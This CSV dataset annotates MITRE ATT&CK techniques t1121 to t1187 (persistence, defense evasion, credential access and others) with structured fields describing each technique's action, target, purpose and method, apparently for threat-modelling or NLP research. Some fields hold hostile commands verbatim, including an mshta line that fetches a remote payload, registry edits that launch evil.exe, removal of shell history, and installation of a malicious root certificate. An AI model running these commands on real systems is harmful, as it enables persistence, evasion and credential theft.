0,1,3,2,tactic,technique,Id,action_what,action_where,where_attribute,when,when_condition,when_object,why_state,why_what,why_where,how,how_what,how_where,precondition,postcondition,alternative_technique,
,,,521,execution,regsvcs/regasm,t1121,use,regsvcs / regasm,,,,,<what> proxy execution <\what> of <where> code <\where>;<what> bypass <\what> <where> process whitelisting <\where><where>specify code <\where>that should be <what> run <\what>,proxy execution;bypass,code;process whitelisting,use of attributes within the binary ,use,[ComRegisterFunction] attribute/[ComUnRegisterFunction] attribute,,,,
,,,110,"persistence,defense evasion",component object model hijacking,t1122,use/hijack,component object model /com/ com reference/com relationship,frequently used object,com object requires a <condition> change <\condition> in the <\object> windows registry <\object>,change,,<what> insert <\what> <attribute>malicious<\attribute> <where> code <\where> that can be <why> executed; maintain persistence,insert;maintain,code;persistence,change/replace registry key,change/replace,registry key,,,,
,1,,49,collection,audio capture,t1123,listen/capture/read/open,audio-recording/audio-device,,,,,gather information,,,,use/levarage,peripheral devices/applications;conversations/malware/scripts / microphones/webcams;voice and video call services,device-access/webcam-access,,audio-device-access/open/read,
,,,692,discovery,system time discovery,t1124,infer/gather,system time/time zone,,,,,,"execute-file, gather, dicover","information, locality information",,use,Net/net time \hostname/'w32tm /tz'/,,,Scheduled Task,
,1,,747,collection,video capture,t1125,capture/write/record,video recording/image/video/image file/webcam/voice call service/video call service,,,,,gather information,,,use malware/script;writing audio file to disk,use;write-audio-file,malware/script/peripheral device/integrated camera/webcam/application/video call service;disk,device-access/webcam-access,vedio-captured,vedio-captured,
,,,389,defense evasion,network share connection removal,t1126,remove/disconnect/detach/,share connection/windows shared drive/windows admin share,,,,,<what>clean up<\what> <where>traces<\where> of their operation,clean up,trace,use net utility; net use \system\share /delete command,use;use,net utility; net use \system\share /delete command,,,,
,,,728,"defense evasion,execution",trusted developer utilities,t1127,use,trusted developer utility/MSBuilld.exe/dnx.exe/rcsi.exe/windbg.exe/cdb.exe/kd.exe/tracker.exe,,utility is signed with valid certificate ,signed with valid certificate ,utility,execute code; bypass application whitelisting,execute;bypass,code;application whitelisting,,,,,,,
,,,384,persistence,netsh helper dll,t1128,use/invoke,netsh.exe,,,,,proxy <what>execution<\what> of arbitrary <where>code<\where>,execute;,code; cobalt strike's payload,using netsh helper DLL; windows registry at hklm\software\microsoft\netsh ; vpn software; modify netsh registry key,use;modify,netsh helper dll/vpn software/windows registry at hklm\software\microsoft\netsh;netsh registry key,,,,
,,,206,execution,execution through module load,t1129,use,Windows module loader,,,,,<what> execute <\what> arbitrary <where>code <\where>on a system; load dll/module,execute;load,code;dll/module,"using windows native api /CreateProcess()/LoadLibrary()/LoadLibraryExW()/DWriteCreateFactory(); via dll pathname specification in IMPORT directory; via dll pathname exported to another dll; via  dll directory pathname in NTFS junction / symlink program.exe.local ; via application manifest; <file name=""filename.extension"" loadFrom=""fully-qualified or relative pathnam",use,"windows native api /CreateProcess()/LoadLibrary()/LoadLibraryExW()/DWriteCreateFactory(); dll pathname specification in IMPORT directory/dll pathname exported to another dll/dll directory pathname in NTFS junction / symlink program.exe.local /application manifest/<file name=""filename.extension"" loadFrom=""fully-qualified or relative pathnam",,,,
,,,301,defense evasion,install root certificate,t1130,install,root certificate,,compromised systems <condition>connect over https to adversary controlled web servers<\condition>,connect over https to adversary controlled web servers,,avoid security warnings prompting users ;collect login credentials;provide a man-in-the-middle capability for intercepting information transmitted over secure tls/ssl communications;sign<\what> malicious code;bypass signature validation tool/sysinternals/antivirus,avoid;collect;provide;intercept;sign;bypass,security warnings prompting users ; login credential;man-in-the-middle capability; information transmitted over secure tls/ssl communication; malicious code;signature validation tool/sysinternals/antivirus,use malicious certificate as trusted root certificate;/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert ;cloning/reinstalling certificate,use;use;clone/reinstall,malicious certificate as trusted root certificate;/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert; certificate,,,,
,,,50,persistence,authentication package,t1131,use,autostart mechanism/LSA Authentication Package,,,,,execute code,execute,code,placing a reference to a binary in the windows registry location hklm\system\currentcontrolset\control\lsa\ with the key value of authentication packages=.,place-binary-reference,"registry key;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\""Authentication Packages""",,,,
,1,,149,command and control,data encoding,t1132,encode,c2 communication/C2 traffic,,,,,hide C2 command,,,using standard data encoding system/ASCII/Unicode/Base64/MIME/UTF-8/ binary-to-text/character encoding system,use,standard data encoding system/ASCII/Unicode/Base64/MIME/UTF-8/ binary-to-text/character encoding system/gzip,encoding-system-available,,data-encoded,
,1,,229,"initial access,persistence",external remote services,t1133,use,remote service,,access has-a <tech> valid accounts <\tech>,,,initially access and/or persist within a network,gain;persist,access;network,"using credential pharming; obtaining the credentials from users, <what> compromising <\what> the <where> enterprise network <\where>;using valid account technique",use;obtain,credential pharming/valid account technique;user credential,,,,
,,,7,defense evasion,access token manupulation,t1134,create/copy/manipulate/impersonate,access token,,adversary must already be in a privileged user context ,,,"elevate their security context from the administrator level to the SYSTEM level;authenticate to a remote system;impersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread; CreateProcessWithTokenW to create a new process running under the security context of the impersonated user.",elevate;authenticate;impersonate;create,security context from the administrator level to the SYSTEM level;remote system;logged on user's security context;new process running under the security context of the impersonated user,duplicating existing token; creating new logon session ; use runas command/windows API function/Metasploit?s Meterpreter payload/Cobalt Strike beacon payload; using token stealing;using LogonUser/SetThreadToken/impersonateLoggedOnUser/CreateProcessWithTokenW/DuplicateToken(Ex),dulicate;create;use,existing token;new logon session;runas command/windows API function/Metasploit?s Meterpreter payload/Cobalt Strike beacon payload/ token stealing/LogonUser/SetThreadToken/impersonateLoggedOnUser/CreateProcessWithTokenW/DuplicateToken(Ex),,,,
,,,391,discovery,network share discovery,t1135,look/search,shared-folder/shared-drive,shared on remote systems,system/network has-a shared network drives and folders,,,,access ;query ;perform,file /directories /system;remote system/ shared drive;lateral movement/collection,,use,net utility/net share/net view \remotesystem/df -aH,,,,
,1,,117,persistence,create account,t1136,create,local account/domain account/local system account/cloud tenant account,,sufficient level of access,,,persistence,maintain,persistence,net user commands,use,net utility/net user command,,,,
,,,424,persistence,office application startup,t1137,change,base template location,,,,,execute dl,execute  ,dll,hijacking the application's search order; modifying the GlobalDotName registry key,hijack;modify,application's search order;GlobalDotName registry key,,,,
,,,428,persistence,office application startup,t1137,create/use,outlook form/outlook rule/outlook home page,,"prior access to the user?s Outlook mailbox, either via an Exchange/OWA server or via the client application",,,obtain persistence,obtain,,,crafted,html page,,,,
,,,420,persistence,office application startup,t1137,insert-vba-macro,base template,,the  respective  office application  starts ,respective  office application  starts,office application,execute code ;  obtain persistence,"execute , obtain",code;persistence,,,,,,,
,,,422,persistence,office application startup,t1137,modify,normal.dotm template,,an adversary may need to  enable macros,enable  macros,macros,<what>include<\what> a malicious <where>macro<\where>,include,macro,,,,,,,
,,,425,persistence,office application startup,t1137,place dll reference,registry key,,,,,,,,HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf,,HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf,,,,
,,,426,persistence,office application startup,t1137,use,office add-ins/Word add-in Libraries/Excel add-in Libraries (WLL/XLL)/VBA add-ins/Office Component Object Model (COM) add-ins/automation add-ins/ VBA Editor (VBE)/ Visual Studio Tools for Office (VSTO) add-ins/ Outlook add-in,,,,,obtain persistence,obtain,persistence,,,,,,,
,,,46,"persistence ,privilege escalation",application shimming,t1138,use,shim/shim database,,,,,"to Bypass User Account Control (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH), and intercept memory addresses (GetProcAddress);elevate privileges, install backdoors, disable defense",use;inject;disable;intercept;elevate;install,Bypass User Account Control /UAC/RedirectEXE;DLLs into processes /InjectDLL/; Data Execution Prevention /DisableNX/Structure Exception Handling/DisableSEH/defense;memory addresse/GetProcAddress;privilege;backdoor,,,,,,,
,1,,56,credential access,bash history,t1139,look/search,file,,<object> user <\object> <condition> logs out <\condition>,logs out,user,potential credentials,get,potential credential,use .bash_history file; ~/.bash_history file,use ,.bash_history file; ~/.bash_history file,,,,
,,,161,defense evasion,deobfuscate/decode files or information,t1140,deobfuscate/decode/reassemble,file/information/executable file/remote access tool/binary fragment,," compressed, archived, or encrypted with Obfuscated Files or Information technique; require user execution technique",,,decode/deobfuscate file,decode/deobfuscate,file,use built-in functionality of malware/scripting/powershell/certutil/ windows copy /b command,use;use,built-in functionality of malware/scripting/powershell/certutil;windows copy /b command,,,,
,1,,298,credential access,input prompt,t1141,mimic/use,input prompt,,,,,<what>prompt<\what> <where>users<\where> for credentials;<what>collect<\what> <where>credentials<\where> via various languages such as applescript[2][3] and powershell,prompt;collect,users;credential,"seemingly legitimate prompt , fake installer requiring additional access , fake malware removal suite;using applescript/powershell",use,fake promt/fake installer/fake malware removal site/applescript/powershell,,,,
,,,299,credential access,input prompt,t1141,prompt-user,credential,,,,,,collect,credential,"seemingly legitimate prompt , fake installer requiring additional access , fake malware removal suite; using applescript/powershell",use,fake promt/fake installer/fake malware removal site/applescript/powershell,,,,
,,,323,credential access,keychain,t1142,access,keychain,,login-keychain-credential is known, known,login-keychain-credential,collect credential,collect,credential,using security command line utility,use,security command line utility,,,,
,,,270,defense evasion,hidden window,t1143,hide/implement,running window/hidden window,,,,,conceal malicious activity ,conceal,malicious activity ,use/abuse os functionality; use scripting language/PowerShell/Jscript/VBScript /powershell.exe -WindowStyle Hidden/plist file tag apple.awt.UIElement,use/abuse, scripting language/PowerShell/Jscript/VBScript /powershell.exe -WindowStyle Hidden/plist file tag apple.awt.UIElement,,,,
,,,259,defense evasion,gatekeeper bypass,t1144,remove/modify/delete/reset,quarantine flag,,sudo access or elevated permission,,,bypass gatekeeper defense,bypass,gatekeeper defense,"using xattr command xattr /path/to/myapp.app ; load  app from USB flash drive, optical disk, external hard drive, or even from a drive shared over the local network",use; load-app,xattr command xattr /path/to/myapp.app; USB flash drive/optical disk/external hard drive/drive shared over the local network/drive-by download,,,,
,,,470,credential access,private keys,t1145,gather/intercept/steal/extract,private key,,system is compromised,,,authenticate remote service/ssh; decrypt file,authenticate;decrypte,remote service/ssh; file,search key directory/file-extension;using Invoke-SessionGopher/Mimikatz's CRYPTO::Extract module ,search;use,key directory/file-extension;  Invoke-SessionGopher/Mimikatz's CRYPTO::Extract module ,private-key-password-protected,private-key-password-exposed,private-key-password-exposed,
,,,474,credential access,private keys,t1145,use,input capture,,,,,to capture privatekey password,capture,privatekey password,use keylogger,use,keylogger; brute force technique,,,,
,,,83,defense evasion,clear command history,t1146,clear/remove/delete,command history,,,,,evade defense; prevent their own commands from appear in these logs,evade;prevent,defense;commands appearing in logs,"using command unset HISTFILE/export HISTFILESIZE=0/ history -c/"" rm ~/.bash_history""; search ""~/.bash_historyfile""/environment variable HISTFILE",use;search,"command unset HISTFILE/export HISTFILESIZE=0/ history -c/"" rm ~/.bash_history"";""~/.bash_historyfile""/environment variable HISTFILE",,,,
,,,268,defense evasion,hidden users,t1147,hide,user accounts,,enabling this property (setting it to yes),,,evade defense,evade,defense ,create account technique with a userid under 500 and setting Hide500Users property value; use sudo dscl . -create /users/username uniqueid 401,create;set/enable;use,account technique with a userid under 500; hide500Users property value;sudo dscl . -create /users/username uniqueid 401,,,,
,,,271,defense evasion,histcontrol,t1148,use,histcontrol,,,,,hide traces; operate without leaving traces ,hide,trace,by simply prepending a space to all of their terminal commands; set ignoredups/ignoreboth,prepend;set,space before terminal command;ignoredups/ignoreboth,,,,
,,,330,defense evasion,lc_main hijacking,t1149,hijack/modify,entry point for a binary,"lc_main , lc_thread , lc_unixthread",,,,"initial execution <what>flows<\what> to a malicious addition , <where>application whitelisting<\where> can be <what>bypassed<\what>",bypass,application whitelisting,modifying LC_MAIN /LC_THREAD/ LC_UNIXTHREAD,modify,LC_MAIN /LC_THREAD/ LC_UNIXTHREAD,,,,
,,,457,"defense evasion,persistence,privilege escalation",plist modification,t1150,modify/use,plist file,,,,,"<what>point<\what> to their own <where>code<\where>;<what>execute<\what> their <where>code<\where> in the context of another user , <what>bypass<\what> <where>whitelisting procedures<\where>",point/execute;bypass,code;whitelisting procedure,modifing file in /Library/Preferences;~/Library/Preferences,modify, /Library/Preferences;~/Library/Preferences,,,,
,,,644,"defense evasion,execution",space after filename,t1151,hide,file extension/file type,,,,,trick users into double clicking benign-looking files,double-click,file,change file extension; append space to the end of filename; rename file,change;append;rename,file extension; space;file,,,,
1,,,327,"defense evasion,execution,persistence",launchctl,t1152,use/install/load/reload/execute/launch/use/abuse,code/agent/deamon/launchctl,,,"allowed, granted","launchctl, elevated previleges",,execute ;bypass,code ; whitelisting,launchctl submit -l -- /path/to/thing/to/execute arg arg arg,use ,"launchctl command/""launchctl submit -l -- /path/to/thing/to/execute arg arg arg""",,,,
,,,642,"defense evasion,execution",source,t1153,use,source comamnd,,,,,execute program,execute,program,source /path/to/filename [arguments];. /path/to/filename [arguments],,source /path/to/filename [arguments];. /path/to/filename [arguments],,,,
,,,,"Execution, Persistence",Trap,t1154,register,code/command,,,,,execute code/command,execute,code,using trap command; trap 'command list' signals,use,trap command; trap 'command list' signals,,,,
,,,36,lateral movement,applescript,t1155,run/use,script/Applescript,the command-line via <how> osascript /path/to/script or osascript -e script here,Application is-a running state,Application,Running-state,interact with SSH connection; move laterally; launch oter technique; present user fake dialog box,"interact,move,launch,present","ssh connection,remote machines,techniques, fake dialog box",using osascript; using command line,use,osascript/command line arguments,osascript-access,applescript-executed,,
,,,1,persistence,.bash_profile and .bashrc,t1156,insert-code/modify,bash_profile file / bashrc file/shell script,,user logs in/opens a new shell,,,gain persistence; execute malicious binary,gain;execute,persistence;binary,inserting shell command,insert,shell command,bashrc-file-access/bash_profile-file-access,bashrc-file-modified/bash_profile-file-modified,bashrc-file-modified/bash_profile-file-modified,
,,,190,"persistence,privilege escalation,defense evasion",dylib hijacking,t1157,plant/place/use,dylib,,,,,gain privilege escalation or persistence,gain;escalate,persistence;privilege,with the same name higher up in the search path;using  dylib hijacking,use,same name in higher up search path/dylib hyjacking,,,,
,,,266,"persistence,defense evasion",hidden files and directories,t1158,hide, file name/folder name/ directory name,,,,,hide files and folders anywhere on the system for persistence and evading a typical user or system analysis,hide;maintain;evade,file/folder;persistence;system analysis,"using Graphical User Interface/attrib.exe/UF_HIDDEN flag;putting a ""."" as the first character in the file or folder name ",use;put,"Graphical User Interface/attrib.exe/UF_HIDDEN flag; ""."" as the first character in the file or folder name ",,,,
,,,324,persistence,launch agent,t1159,install/configure,launch agent,,,,,execute at login<what>load<\what> a <where> plist <\where>,load,plist,"using launchd or launchctl;System/Library/LaunchAgents, /Library/LaunchAgents, and $HOME/Library/LaunchAgents; disguise agent name",disguise;use,agent name;launchd/launchctl; System/Library/LaunchAgents; /Library/LaunchAgents; $HOME/Library/LaunchAgents,,,,
,,,325,"persistence,privilege escalation",launch daemon,t1160,install/create/configure/modify,launch daemon,,,,,load a plist into the appropriate directories;escalate privileges from administrator to root,load;escalate,plist;privilege,using launchd or launchctl;System/Library/LaunchDaemons; /Library/LaunchDaemons; disguise agent name,disguise;use,agent name;launchd/launchctl; System/Library/LaunchDaemons; /Library/LaunchDaemons,,,,
,,,329,persistence,lc_load_dylib addition,t1161,remove,LC_CODE_SIGNATURE command ,,,,,signature isn?t checked at load time,avoid,signature check,<what>removing <\what>the <where> lc_code_signature<\where>command,remove,lc_code_signature,,,,
,,,339,persistence,login item,t1162,register/modify/set,login item/plist file,com.apple.loginitems.plist; ~/Library/Preferences/,,,,execute their code;persistence mechanisms,execute;maintain,code;persistence,using API method SMLoginItemSetEnabled/scripting languages/AppleScript ,use,API method SMLoginItemSetEnabled/scripting language/AppleScript ,,,,
,,,514,persistence,rc.common,t1163,use,rc.common file,,,,,<what>hide<\what> <where>code<\where> for persistence,hide;maintain,code;persistence,modify rc.common file,modify,rc.common file,,,,
,,,551,persistence,re-opened applications,t1164,modify,property list file/plist file/loginwindow plist file,,,,,"<what>include<\what> a <where>link<\where> to their malicious executable , <what>provide<\what> apersistence mechanism;specify application to re-opened",include /provide;specify,link to executable;application to reopen,modify ~/Library/Preferences/com.apple.loginwindow.plist ; ~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist,modify,~/Library/Preferences/com.apple.loginwindow.plist ; ~/Library/Preferences/ByHost/com.apple.loginwindow.* .plist,,,,
,,,,"Persistence, Privilege Escalation",Startup Items,t1165,create/modify,startup item/ startup item directory file/startup item directory folder,,,,,register persistence mehanism; escalate privilege,register;escalate,persistence mechanism; priviledge,,,,,,,
,1,,591,"privilege escalation,persistence",setuid and setgid,t1166,set,setuid flag/setgid bits,,,,,get <where>code<\where> <what>running<\what> in a different user context; do shell escape; exploit vulnerability,run,code,using chmod command via bitmasking; chmod 4777 [file]; chmod u+s [file],use ,chmod via bitmasking; chmod 4777 [file]; chmod u+s [file,,,,
,,,581,Credential Access,Securityd Memory,T1167,scan,securityd memory,,adversary has-a root access,root access,access, find  the correct sequence of key,find,key,,,,,,,
,,,,"Persistence, Execution",Local Job Scheduling,t1168,schedule,job/executable execution/program execution,,,,,"execute program/command/script at start up,speicific time;scheduled basis for Persistence;conduct Execution as part of Lateral Movement; gain root privileges, ;run a process under the context of a specific account.",execute;maitain;perform;gain;run,"program/command/script ;Persistence; Execution / Lateral Movement; root privileges, ;rprocess under the context of a specific account",using cron job/cron tab/cron daemon/at program/launchd; modifying plist file/crontab file/cron.d file,use;modify,cron job/cron tab/cron daemon/at program/launchd; plist file/crontab file/cron.d file,,,,
,,,666,privilege escalation,sudo,t1169,use,sudoers file configuration,,must have <condition>elevated <object>privileges<\object><\condition> to edit this file,elevated <object>privileges<\object>,privileges,"<what>execute<\what> <where>commands<\where> as other users , <what>spawn<\what> <where>processes<\where> with higher privileges",execute ;spawn,command; processe,modifying sudoers file,modify,sudoers file,,,,
,,,364,defense evasion,mshta,t1170,execute,file/.hta file/javascript/VBscript,,,,,<what> proxy execution <\what>of <attribute> malicious.hta <\attribute> <where> files <\where> and <where> javascript<\where> or <where>vbscript <\where>;bypass application whitelisting solution;bypass browser security setting,proxy-execution; bypass,code;application whitelisting solution/bypass browser security setting,"use Mshta.exe/msta; use vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")"")); mshta http[:]//webserver/payload[.]hta",use;use;use,"Mshta.exe/msta;  vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")"")); mshta http[:]//webserver/payload[.]hta",,,,
,,,334,credential access,llmnr/nbt-ns poisoning and relay,t1171,collect/crack,username/ntlmv2 hash/hash,,host requires identification/authentication,requires identification/authentication,host,obtain the plaintext password,obtain,palaintext password,using traffic monitoring tool;using network sniffing tool ; using brute force,use,traffic monitoring tool; network sniffing tool ; brute force,ntlmv2-hash-unknown,,ntlmv2-hash-exposed,
,,,335,credential access,llmnr/nbt-ns poisoning and relay,t1171,intercept/relay,ntlmv2 hash/hash,,automated scan is-a authenticated,authenticated,automated scan,obtain the plaintext password;execute code,obtain;execute,palaintext password;code,,use,tool/responder/metasploit/nbnspoof,ntlmv2-hash-unknown,,ntlmv2-hash-exposed,
,,,333,credential access,llmnr/nbt-ns poisoning and relay,t1171,spoof,authoritative source,,,,,obtain the plaintext password; poison name servcie,obtain; poison,palaintext password; name service ,responding to llmnr/udp-5355/nbt-ns/udp-137 traffic,respond,llmnr/udp-5355/nbt-ns/udp-137 traffic,ntlmv2-hash-unknown,,ntlmv2-hash-exposed,
1,,,178,command and control,domain fronting,t1172,obfuscate/hide,destination,,,,,domain fronting/hiding/disguise,hiding/disguise,destination,"using TLS, HTTP, TLS header SNI field are not equal to HTTP header",use,TLS and HTTP;TLS header SNI field are not equal to HTTP header,SNI-field-in-TLS-and-HTTP-not-equal,,traffic-redirected(??),
,,,195,execution,dynamic data exchange,t1173,poison,microsoft office document,,,,,<what> execute <\what>arbitrary <where> commands <\where><what> deliver <\what> <where> execution <\where> via <attribute> phishing campaigns or hosted web content <\attribute><what> avoiding <\what> the use of visual basic for applications (vba) macros,execute/deliver;avoiding,command;vba macro execution,"using dde commands, directly or through embedded files",use,dde command/embedded file,,,,
,,,194,execution,dynamic data exchange,t1173,use,DDE/dynamic data exchange/OLe/object linking and embedding,,,,,<what> execute <\what>arbitrary <where> commands <\where><what> deliver <\what> <where> execution <\where> via <attribute> phishing campaigns or hosted web content <\attribute><what> avoiding <\what> the use of visual basic for applications (vba) macros,execute/deliver;avoiding,command;vba macro execution,,,,,,,
,,,445,credential access,password filter dll,t1174,register,password filter DLL,malicious,filters must receive plain-text credentials,receive plain-text credential,password filter,harvest/obtain credential,harvest/obtain,credential,,,,ntlmv2-hash-unknown,ntlmv2-hash-exposed,ntlmv2-hash-exposed,
,,,168,lateral movement,distributed component object model,t1175,execute/activate/launch,macro/shellcode/com object/DDE comand,,permission to interact with local and remote COM object,permisssion,COM object,move laterally to system; escalate privilege,move-laterally; escalate,system; privilege,using DCOM/COM,use,DCOM/COM,DCOM-access-permission,remote-communication-occurred,,
,,,67,persistence,browser extensions,t1176,install,malicious extension/browser extension/chrome extension/safari extension,,security can be limited on browser app stores,,,browse website;steal all information/credential;used as an installer for a RAT;maintain persistence;command & control,browse;steal;use;maintain,website;information/credential;RAT installer;persistence/command&control,malicious app store downloads masquerading as legitimate extensions;social engineering;adversary that has already compromised a system,masquerade;use,legitimate extension;social engineering,,,,
,,,342,"execution,persistence",lsass driver,t1177,target/use,lsass.exe,,,,,obtain execution;persistence,execute,code ,"<what> replacing <\what> or <what> adding <\what> <attribute> illegitimate <\attribute> <where> drivers <\where> (e.g., <where> dll side-loading <\where>or <where> dll search order hijacking <\where>)",replace/add;use,driver;dll side-loading technique/dll search order hijacking technique,,,,
,,,603,privilege escalation,sid-history injection,t1178,insert-sid-value,sid history,,domain administrator (or equivalent) rights,,,"<what>enable impersonation<\what>of arbitrary <where>users<\where>/<where>groups<\where> , elevated access to local resources",impersonate,user / group,using SID-History Injection,use,SID-History Injection technique,,"Remote Services, Windows Admin Shares, or Windows Remote Management",,
,,,277,"persistence,privilege escalation,credential access",hooking,t1179,hook/capture,API function/process/CredEnumerateA API/win32 API,,,,,"conceal files, processes, registry keys, and other objects in order to hide malware and associated behaviors;reveal user authentication credential; load and execute malicious code; redirect code flow",conceal/hide;reveal;load/execute;redirect,file/process/registry key/malware;user authentication credential;code;code flow,modifying IAT pointers to CreateWindowEx; injecting it into every GUI process;spawn system thread,modify;inject;spawn,IAT pointers to CreateWindowEx;program;system thread,,,,
,,,274,"persistence,privilege escalation,credential access",hooking,t1179,install,hooking mechanism,,,,,persistence via continuous invocation,maintain,persistence,overwrites the first bytes in an API function;modify process process IAT;using hooking procedure,overwrite;modify;use,first byte of API function;process IAT;hokking procedure,,,,
,,,568,persistence,screensaver,t1180,use/modify,screensaver setting registry key,"scrnsave.exe , screensaveactive , screensaverissecure , screensavertimeout",,,,"<what>maintain<\what>persistence , <what>run<\what> <where>malware<\where> after a certain timeframe of user inactivity",maintain / run,malware,"modify HKCU\Control Panel\Desktop\scrnsave.exe , HKCU\Control Panel\Desktop\screensaveactive , HKCU\Control Panel\Desktop\screensaverissecure , HKCU\Control Panel\Desktop\screensavertimeout",modify,HKCU\Control Panel\Desktop\scrnsave.exe; HKCU\Control Panel\Desktop\screensaveactive; HKCU\Control Panel\Desktop\screensaverissecure;HKCU\Control Panel\Desktop\screensavertimeout,,,,
,,,232,"privilege escalation,defense evasion",extra window memory injection,t1181,overwrite/modify,Extra Window Memory location,,,,,bypass protection mechanisms such as data execution prevention (DEP);avoids the use of highly monitored API calls such as WriteProcessMemory and CreateRemoteThread;access to both the target process's memory and possibly elevated privilege,bypass/avoid;allow-access;elevate,protection mechanism/data execution prevention (DEP)/use of highly monitored API calls/WriteProcessMemory / CreateRemoteThread; process's memory;privilege,"writing code to shared sections of the process?s memory, placing a pointer to the code in EWM",write-code/write-payload/place-pointer,EWM/Extra Window Memory,,,,
,,,29,"persistence ,privilege escalation",appcert dlls,t1182,abuse/use/modify,AppCertDLLs Registry key,,,,,obtain persistence and privilege escalation;load malicious dll,obtain;escalate;load,persistence;privilege;malicious dll,"calls the ubiquitously used application programming interface (api) functions <where> createprocess<\where>, <where> createprocessasuser<\where>, <where> createprocesswithloginw<\where>, <where> createprocesswithtokenw<\where>, or <where> winexec <\where>",use,application programming interface (api) functions /createprocess/createprocessasuser/ createprocesswithloginw/createprocesswithtokenw/winexec/; HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager,,,,
,,,279,"persistence,privilege escalation,defense evasion",image file execution options injection,t1183,abuse/use/modify/overwrite,Image File Execution Options registry key values,,,,,obtain persistence and privilege escalation,obtain;escalate ,persistence;privilege,reg add hklm\software\microsoft\windows nt\currentversion\image file execution options\notepad.exe /v globalflag /t reg_dword /d 512reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe /v reportingmode /t reg_dword /d 1reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe /v monitorprocess /d c:\temp\evil.exe causing a malicious executable to be loaded and run,,reg add hklm\software\microsoft\windows nt\currentversion\image file execution options\notepad.exe /v globalflag /t reg_dword /d 512reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe /v reportingmode /t reg_dword /d 1reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe /v monitorprocess /d c:\temp\evil.exe causing a malicious executable to be loaded and run,,,,
,,,281,"persistence,privilege escalation,defense evasion",image file execution options injection,t1183,use/install ,ifeo/ifeo mechanism,,,,,defense evasion;obtain persistence and privilege escalation,evade;maintain;escalate,defense;persistence;privilege,registering invalid debuggers that redirect and effectively disable various system and security applications,register,malicious debugger,,,,
,,,659,lateral movement,ssh hijacking,t1184,hijack,connection/SSH session,,obtain root access,adversary has-a root-access,,move laterally to system,move-laterally,system,"compromising the ssh agent , using agent's socket",compromise;use,ssh-agent;agent-socket,root-access-granted,,SSH-session-compromised,
,1,,344,collection,man in the browser,t1185,inject-software/inject-code,browser,,,"require,high-intregity","sedebugprivilege,process","change content, modify behavior, and intercept information; inherit cookies ,inherithttp sessions ,inherit ssl client certificates , use the browser as a way to pivot into an authenticated intranet , redirect any http and https traffic",change/modify; intercept/inherit; redirect,content/behavior/information;cookies/http sessions/ssl client certificates; http/https traffic,"setting up an http proxy, use-security vulnerability/browser functionality",use;set,security vulnerability/browser functionality;http proxy,browser has-a SeDebugPrivilege; Process is-a high intigrity,,,
,,,481,defense evasion,process doppelganging,t1186,"create , overwrite , create , load , undo change , remove , create , initiate execute","txf transaction , file , shared section of memory , executable , executable , code , process","malicious code , tainted section of memory",,,,<what>evade<\what> <where>defenses<\where> and <where>detection<\where>,evade,defense; detection,<what>using<\what> a legitimate <where>executable<\where>,use,legitimate executable,,,,
,,,477,defense evasion,process doppelganging,t1186,launch/inject/conceal,process,,,,,evade defenses and detection; avoid use of highly monitored api function/NtUnmapViewOfSection/ VirtualProtectEx/SetThreadContext,evade;avoid use of,defense/detection;highly monitored api function/NtUnmapViewOfSection/ VirtualProtectEx/SetThreadContext,use TxF transaction/ Windows Transactional NTFS; use Process Doppelganging,use,TxF transaction/ Windows Transactional NTFS/Process Doppelganging,,,,
,,,258,credential access,forced authentication,t1187,place,.lnk file /.scf file,navigation apth,,,,<what> load <\what> the <where> resource <\where>repeatedly gather credentials; gain access to user account hash,load;gain access,resource;user account hash,with the icon filename pointing to an external reference ;through forced SMB authentication,point;force,external reference;smb authentication,,brute force,,
